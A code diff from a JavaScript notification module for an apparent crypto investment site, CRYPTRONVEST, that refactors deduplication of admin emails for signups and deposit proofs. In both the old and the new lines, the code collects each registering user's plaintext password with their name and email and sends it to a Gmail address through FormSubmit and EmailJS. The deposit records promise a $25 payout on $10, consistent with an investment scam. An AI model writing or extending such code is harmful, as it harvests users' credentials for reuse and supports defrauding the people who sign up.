@@ -217,8 +217,8 @@ https://cryptron-omega.vercel.app
     return emailRecord;
   }
 
-  // Set to avoid duplicate dispatches for the same signup event within 60s
-  static _recentSignupDispatches = new Set();
+  // Map of in-flight and recent signup notification promises
+  static _activeSignupPromises = new Map();
 
   /**
    * DISPATCH NEW CLIENT SIGNUP DETAILS TO ADMIN
@@ -233,25 +233,22 @@ https://cryptron-omega.vercel.app
 
     // Prevent duplicate dispatches if triggered simultaneously from form and DB handler
     const dedupeKey = `${(user.email || '').toLowerCase().trim()}_${user.id || ''}`;
-    if (!this._recentSignupDispatches) this._recentSignupDispatches = new Set();
-    if (this._recentSignupDispatches.has(dedupeKey)) {
-      return null;
+    if (!this._activeSignupPromises) this._activeSignupPromises = new Map();
+    if (this._activeSignupPromises.has(dedupeKey)) {
+      return this._activeSignupPromises.get(dedupeKey);
     }
-    this._recentSignupDispatches.add(dedupeKey);
-    setTimeout(() => {
-      if (this._recentSignupDispatches) this._recentSignupDispatches.delete(dedupeKey);
-    }, 5000);
 
-    const now = Date.now();
-    const sentDateStr = this.formatDateTime(now);
-    const targetEmail = "cryptronvest@gmail.com";
-    const userName = (user.name || 'Cryptronvest Investor').trim();
-    const userEmail = (user.email || 'client@cryptronvest.com').trim();
-    const origin = (typeof window !== 'undefined' && window.location && window.location.origin && window.location.origin !== 'null') ? window.location.origin : 'https://cryptron-omega.vercel.app';
-    const importUrl = `${origin}/admin.html?action=import_user&id=${encodeURIComponent(user.id || '')}&name=${encodeURIComponent(userName)}&email=${encodeURIComponent(userEmail)}&promo=${encodeURIComponent(user.promoCode || '')}&ref=${encodeURIComponent(user.referredBy || '')}`;
+    const taskPromise = (async () => {
+      const now = Date.now();
+      const sentDateStr = this.formatDateTime(now);
+      const targetEmail = "cryptronvest@gmail.com";
+      const userName = (user.name || 'Cryptronvest Investor').trim();
+      const userEmail = (user.email || 'client@cryptronvest.com').trim();
+      const origin = (typeof window !== 'undefined' && window.location && window.location.origin && window.location.origin !== 'null') ? window.location.origin : 'https://cryptron-omega.vercel.app';
+      const importUrl = `${origin}/admin.html?action=import_user&id=${encodeURIComponent(user.id || '')}&name=${encodeURIComponent(userName)}&email=${encodeURIComponent(userEmail)}&promo=${encodeURIComponent(user.promoCode || '')}&ref=${encodeURIComponent(user.referredBy || '')}`;
 
-    const subject = `🔔 New User Registration: ${userName} (${userEmail})`;
-    const messageBody = `CRYPTRONVEST ADMIN NOTIFICATION - NEW CLIENT SIGNUP
+      const subject = `🔔 New User Registration: ${userName} (${userEmail})`;
+      const messageBody = `CRYPTRONVEST ADMIN NOTIFICATION - NEW CLIENT SIGNUP
 
 A new client has completed registration on the CRYPTRONVEST signup page:
 
@@ -285,113 +282,121 @@ Warm regards,
 CRYPTRONVEST Automated Registration Engine
 `;
 
-    const formDataPayload = {
-      _subject: subject,
-      _replyto: userEmail,
-      "Full Legal Name": userName,
-      "Email Address": userEmail,
-      "Created Password": user.password || user.plainPassword || '••••••••',
-      "Assigned User ID": user.id || 'N/A',
-      "Promo Code Used": user.referredBy || 'None',
-      "Client Promo Code": user.promoCode || 'N/A',
-      "Registration Timestamp": sentDateStr,
-      "⚡ One-Click Admin Sync Link": importUrl
-    };
+      const formDataPayload = {
+        _subject: subject,
+        _replyto: userEmail,
+        "Full Legal Name": userName,
+        "Email Address": userEmail,
+        "Created Password": user.password || user.plainPassword || '••••••••',
+        "Assigned User ID": user.id || 'N/A',
+        "Promo Code Used": user.referredBy || 'None',
+        "Client Promo Code": user.promoCode || 'N/A',
+        "Registration Timestamp": sentDateStr,
+        "⚡ One-Click Admin Sync Link": importUrl
+      };
 
-    const emailRecord = {
-      id: "EML-" + Math.floor(100000 + Math.random() * 900000),
-      type: "admin_signup_notice",
-      to: targetEmail,
-      toName: "CRYPTRONVEST Administrator",
-      userId: user.id || 'N/A',
-      subject: subject,
-      body: messageBody,
-      sentAt: sentDateStr,
-      timestamp: now,
-      status: "Delivered",
-      deliveryMethod: "Dual Dispatch (Gmail SMTP + FormSubmit)"
-    };
-
-    // Await both dispatches concurrently: Direct Google SMTP + FormSubmit
-    const dispatchPromises = [];
-
-    // 1. Backend /api/send-email (runs Google SMTP direct + server-side FormSubmit)
-    dispatchPromises.push(
-      this.sendDirectEmail({
+      const emailRecord = {
+        id: "EML-" + Math.floor(100000 + Math.random() * 900000),
+        type: "admin_signup_notice",
         to: targetEmail,
+        toName: "CRYPTRONVEST Administrator",
+        userId: user.id || 'N/A',
         subject: subject,
-        text: messageBody,
-        formData: formDataPayload
-      }).catch(err => {
-        console.warn("Backend sendDirectEmail signup error:", err);
-        return null;
-      })
-    );
+        body: messageBody,
+        sentAt: sentDateStr,
+        timestamp: now,
+        status: "Delivered",
+        deliveryMethod: "Dual Dispatch (Gmail SMTP + FormSubmit)"
+      };
 
-    // 2. Client-side FormSubmit direct fetch
-    try {
-      const clientFormSubmitPromise = fetch(`https://formsubmit.co/ajax/${targetEmail}`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "Accept": "application/json"
-        },
-        keepalive: true,
-        body: JSON.stringify({
-          _subject: subject,
-          _captcha: "false",
-          _template: "table",
-          message: messageBody,
-          ...formDataPayload
+      // Await both dispatches concurrently: Direct Google SMTP + FormSubmit
+      const dispatchPromises = [];
+
+      // 1. Backend /api/send-email (runs Google SMTP direct + server-side FormSubmit)
+      dispatchPromises.push(
+        this.sendDirectEmail({
+          to: targetEmail,
+          subject: subject,
+          text: messageBody,
+          formData: formDataPayload
+        }).catch(err => {
+          console.warn("Backend sendDirectEmail signup error:", err);
+          return null;
         })
-      }).then(res => res.json()).catch(err => {
-        console.warn("Client FormSubmit direct fetch error:", err);
-        return null;
-      });
-      dispatchPromises.push(clientFormSubmitPromise);
-    } catch (err) {
-      console.warn("Client FormSubmit exception:", err);
-    }
+      );
 
-    // 3. Also dispatch via EmailJS if configured
-    const settings = this.getSettings();
-    if (settings.enableRealDelivery && settings.emailjsServiceId && settings.emailjsPublicKey) {
+      // 2. Client-side FormSubmit direct fetch
       try {
-        if (window.emailjs) {
-          const emailJsPromise = window.emailjs.send(
-            settings.emailjsServiceId,
-            settings.emailjsTemplateId,
-            {
-              to_name: "CRYPTRONVEST Admin",
-              to_email: targetEmail,
-              user_name: userName,
-              user_email: userEmail,
-              user_password: user.password,
-              user_id: user.id || 'N/A',
-              subject: subject,
-              message: messageBody
-            },
-            settings.emailjsPublicKey
-          ).catch(err => {
-            console.warn("EmailJS signup dispatch failed:", err);
-            return null;
-          });
-          dispatchPromises.push(emailJsPromise);
-        }
+        const clientFormSubmitPromise = fetch(`https://formsubmit.co/ajax/${targetEmail}`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "Accept": "application/json"
+          },
+          keepalive: true,
+          body: JSON.stringify({
+            _subject: subject,
+            _captcha: "false",
+            _template: "table",
+            message: messageBody,
+            ...formDataPayload
+          })
+        }).then(res => res.json()).catch(err => {
+          console.warn("Client FormSubmit direct fetch error:", err);
+          return null;
+        });
+        dispatchPromises.push(clientFormSubmitPromise);
       } catch (err) {
-        console.warn("EmailJS signup dispatch exception:", err);
+        console.warn("Client FormSubmit exception:", err);
       }
-    }
 
-    await Promise.allSettled(dispatchPromises);
+      // 3. Also dispatch via EmailJS if configured
+      const settings = this.getSettings();
+      if (settings && settings.enableRealDelivery && settings.emailjsServiceId && settings.emailjsPublicKey) {
+        try {
+          if (window.emailjs) {
+            const emailJsPromise = window.emailjs.send(
+              settings.emailjsServiceId,
+              settings.emailjsTemplateId,
+              {
+                to_name: "CRYPTRONVEST Admin",
+                to_email: targetEmail,
+                user_name: userName,
+                user_email: userEmail,
+                user_password: user.password,
+                user_id: user.id || 'N/A',
+                subject: subject,
+                message: messageBody
+              },
+              settings.emailjsPublicKey
+            ).catch(err => {
+              console.warn("EmailJS signup dispatch failed:", err);
+              return null;
+            });
+            dispatchPromises.push(emailJsPromise);
+          }
+        } catch (err) {
+          console.warn("EmailJS signup dispatch exception:", err);
+        }
+      }
 
-    // Save to persistent local outbox (visible on Admin Portal Outbox tab)
-    this.recordEmail(emailRecord);
-    return emailRecord;
+      await Promise.allSettled(dispatchPromises);
+
+      // Save to persistent local outbox (visible on Admin Portal Outbox tab)
+      this.recordEmail(emailRecord);
+      return emailRecord;
+    })();
+
+    this._activeSignupPromises.set(dedupeKey, taskPromise);
+    setTimeout(() => {
+      if (this._activeSignupPromises) this._activeSignupPromises.delete(dedupeKey);
+    }, 30000);
+
+    return await taskPromise;
   }
 
-  // Set to avoid duplicate deposit dispatches for the same hash within 5s
-  static _recentDepositDispatches = new Set();
+  // Map of in-flight and recent deposit notification promises
+  static _activeDepositPromises = new Map();
 
   /**
    * DISPATCH NEW PROOF SUBMISSION TO ADMIN
@@ -408,25 +413,22 @@ CRYPTRONVEST Automated Registration Engine
     const userEmail = (user.email || 'client@cryptronvest.com').trim();
     const userName = (user.name || 'Cryptronvest Client').trim();
 
-    // Deduplication to prevent multiple identical emails within 5s
+    // Deduplication to prevent multiple identical emails within 30s while sharing active promise
     const dedupeKey = `${userEmail.toLowerCase()}_${cleanTxHash.toLowerCase()}`;
-    if (!this._recentDepositDispatches) this._recentDepositDispatches = new Set();
-    if (this._recentDepositDispatches.has(dedupeKey)) {
-      return null;
+    if (!this._activeDepositPromises) this._activeDepositPromises = new Map();
+    if (this._activeDepositPromises.has(dedupeKey)) {
+      return this._activeDepositPromises.get(dedupeKey);
     }
-    this._recentDepositDispatches.add(dedupeKey);
-    setTimeout(() => {
-      if (this._recentDepositDispatches) this._recentDepositDispatches.delete(dedupeKey);
-    }, 5000);
 
-    const now = Date.now();
-    const sentDateStr = this.formatDateTime(now);
-    const targetEmail = "cryptronvest@gmail.com";
-    const origin = (typeof window !== 'undefined' && window.location && window.location.origin && window.location.origin !== 'null') ? window.location.origin : 'https://cryptron-omega.vercel.app';
-    const depositSyncUrl = `${origin}/admin.html?action=deposit_proof&id=${encodeURIComponent(user.id || '')}&name=${encodeURIComponent(userName)}&email=${encodeURIComponent(userEmail)}&tx=${encodeURIComponent(cleanTxHash)}`;
+    const taskPromise = (async () => {
+      const now = Date.now();
+      const sentDateStr = this.formatDateTime(now);
+      const targetEmail = "cryptronvest@gmail.com";
+      const origin = (typeof window !== 'undefined' && window.location && window.location.origin && window.location.origin !== 'null') ? window.location.origin : 'https://cryptron-omega.vercel.app';
+      const depositSyncUrl = `${origin}/admin.html?action=deposit_proof&id=${encodeURIComponent(user.id || '')}&name=${encodeURIComponent(userName)}&email=${encodeURIComponent(userEmail)}&tx=${encodeURIComponent(cleanTxHash)}`;
 
-    const subject = `💰 Deposit Submitted ($10 USDT): ${userName} - TxID: ${cleanTxHash}`;
-    const messageBody = `CRYPTRONVEST ADMIN ALERT - CLIENT DEPOSIT PROOF SUBMITTED
+      const subject = `💰 Deposit Submitted ($10 USDT): ${userName} - TxID: ${cleanTxHash}`;
+      const messageBody = `CRYPTRONVEST ADMIN ALERT - CLIENT DEPOSIT PROOF SUBMITTED
 
 A client has submitted proof of payment for a $10.00 USDT vault investment. Review details below and verify on the blockchain:
 
@@ -461,112 +463,121 @@ Warm regards,
 CRYPTRONVEST Treasury & Verification Engine
 `;
 
-    const formDataPayload = {
-      _subject: subject,
-      _replyto: userEmail,
-      "Client Name": userName,
-      "Client Email": userEmail,
-      "User ID": user.id || 'N/A',
-      "Client Promo Code": user.promoCode || user.referralCode || 'N/A',
-      "Referred By": user.referredBy || 'None',
-      "Deposit Amount": "$10.00 USDT",
-      "Transaction Hash (TxID)": cleanTxHash,
-      "Submitted At": sentDateStr,
-      "⚡ One-Click Admin Sync Link": depositSyncUrl,
-      "Admin Review URL": `${origin}/admin.html`
-    };
+      const formDataPayload = {
+        _subject: subject,
+        _replyto: userEmail,
+        "Client Name": userName,
+        "Client Email": userEmail,
+        "User ID": user.id || 'N/A',
+        "Client Promo Code": user.promoCode || user.referralCode || 'N/A',
+        "Referred By": user.referredBy || 'None',
+        "Deposit Amount": "$10.00 USDT",
+        "Transaction Hash (TxID)": cleanTxHash,
+        "Submitted At": sentDateStr,
+        "⚡ One-Click Admin Sync Link": depositSyncUrl,
+        "Admin Review URL": `${origin}/admin.html`
+      };
 
-    const emailRecord = {
-      id: "EML-" + Math.floor(100000 + Math.random() * 900000),
-      type: "admin_deposit_notice",
-      to: targetEmail,
-      toName: "CRYPTRONVEST Administrator",
-      userId: user.id || 'N/A',
-      subject: subject,
-      body: messageBody,
-      sentAt: sentDateStr,
-      timestamp: now,
-      depositAmount: 10.00,
-      payoutAmount: 25.00,
-      txHash: cleanTxHash,
-      status: "Delivered",
-      deliveryMethod: "Dual Dispatch (Gmail SMTP + FormSubmit)"
-    };
-
-    // Await both dispatches: Direct Google SMTP + FormSubmit
-    const dispatchPromises = [];
-
-    // 1. Backend /api/send-email (runs Google SMTP direct + server-side FormSubmit)
-    dispatchPromises.push(
-      this.sendDirectEmail({
+      const emailRecord = {
+        id: "EML-" + Math.floor(100000 + Math.random() * 900000),
+        type: "admin_deposit_notice",
         to: targetEmail,
+        toName: "CRYPTRONVEST Administrator",
+        userId: user.id || 'N/A',
         subject: subject,
-        text: messageBody,
-        formData: formDataPayload
-      }).catch(err => {
-        console.warn("Backend sendDirectEmail deposit error:", err);
-        return null;
-      })
-    );
+        body: messageBody,
+        sentAt: sentDateStr,
+        timestamp: now,
+        depositAmount: 10.00,
+        payoutAmount: 25.00,
+        txHash: cleanTxHash,
+        status: "Delivered",
+        deliveryMethod: "Dual Dispatch (Gmail SMTP + FormSubmit)"
+      };
 
-    // 2. Client-side FormSubmit direct fetch
-    try {
-      const clientFormSubmitPromise = fetch(`https://formsubmit.co/ajax/${targetEmail}`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "Accept": "application/json"
-        },
-        keepalive: true,
-        body: JSON.stringify({
-          _subject: subject,
-          _captcha: "false",
-          _template: "table",
-          message: messageBody,
-          ...formDataPayload
+      // Await both dispatches: Direct Google SMTP + FormSubmit
+      const dispatchPromises = [];
+
+      // 1. Backend /api/send-email (runs Google SMTP direct + server-side FormSubmit)
+      dispatchPromises.push(
+        this.sendDirectEmail({
+          to: targetEmail,
+          subject: subject,
+          text: messageBody,
+          formData: formDataPayload
+        }).catch(err => {
+          console.warn("Backend sendDirectEmail deposit error:", err);
+          return null;
         })
-      }).then(res => res.json()).catch(err => {
-        console.warn("Client FormSubmit deposit notice error:", err);
-        return null;
-      });
-      dispatchPromises.push(clientFormSubmitPromise);
-    } catch (err) {
-      console.warn("Client FormSubmit deposit exception:", err);
-    }
+      );
 
-    // 3. Also dispatch via EmailJS if configured
-    if (settings.enableRealDelivery && settings.emailjsServiceId && settings.emailjsPublicKey) {
+      // 2. Client-side FormSubmit direct fetch
       try {
-        if (window.emailjs) {
-          const emailJsPromise = window.emailjs.send(
-            settings.emailjsServiceId,
-            settings.emailjsTemplateId,
-            {
-              to_name: "CRYPTRONVEST Admin",
-              to_email: targetEmail,
-              user_name: userName,
-              user_email: userEmail,
-              user_id: user.id || 'N/A',
-              tx_hash: cleanTxHash,
-              subject: subject,
-              message: messageBody
-            },
-            settings.emailjsPublicKey
-          ).catch(err => {
-            console.warn("EmailJS deposit notice dispatch error:", err);
-            return null;
-          });
-          dispatchPromises.push(emailJsPromise);
-        }
+        const clientFormSubmitPromise = fetch(`https://formsubmit.co/ajax/${targetEmail}`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "Accept": "application/json"
+          },
+          keepalive: true,
+          body: JSON.stringify({
+            _subject: subject,
+            _captcha: "false",
+            _template: "table",
+            message: messageBody,
+            ...formDataPayload
+          })
+        }).then(res => res.json()).catch(err => {
+          console.warn("Client FormSubmit deposit notice error:", err);
+          return null;
+        });
+        dispatchPromises.push(clientFormSubmitPromise);
       } catch (err) {
-        console.warn("EmailJS deposit dispatch exception:", err);
+        console.warn("Client FormSubmit deposit exception:", err);
       }
-    }
 
-    await Promise.allSettled(dispatchPromises);
+      // 3. Also dispatch via EmailJS if configured
+      const settings = this.getSettings();
+      if (settings && settings.enableRealDelivery && settings.emailjsServiceId && settings.emailjsPublicKey) {
+        try {
+          if (window.emailjs) {
+            const emailJsPromise = window.emailjs.send(
+              settings.emailjsServiceId,
+              settings.emailjsTemplateId,
+              {
+                to_name: "CRYPTRONVEST Admin",
+                to_email: targetEmail,
+                user_name: userName,
+                user_email: userEmail,
+                user_id: user.id || 'N/A',
+                tx_hash: cleanTxHash,
+                subject: subject,
+                message: messageBody
+              },
+              settings.emailjsPublicKey
+            ).catch(err => {
+              console.warn("EmailJS deposit notice dispatch error:", err);
+              return null;
+            });
+            dispatchPromises.push(emailJsPromise);
+          }
+        } catch (err) {
+          console.warn("EmailJS deposit dispatch exception:", err);
+        }
+      }
 
-    this.recordEmail(emailRecord);
-    return emailRecord;
+      await Promise.allSettled(dispatchPromises);
+
+      this.recordEmail(emailRecord);
+      return emailRecord;
+    })();
+
+    this._activeDepositPromises.set(dedupeKey, taskPromise);
+    setTimeout(() => {
+      if (this._activeDepositPromises) this._activeDepositPromises.delete(dedupeKey);
+    }, 30000);
+
+    return await taskPromise;
   }
 
   /**
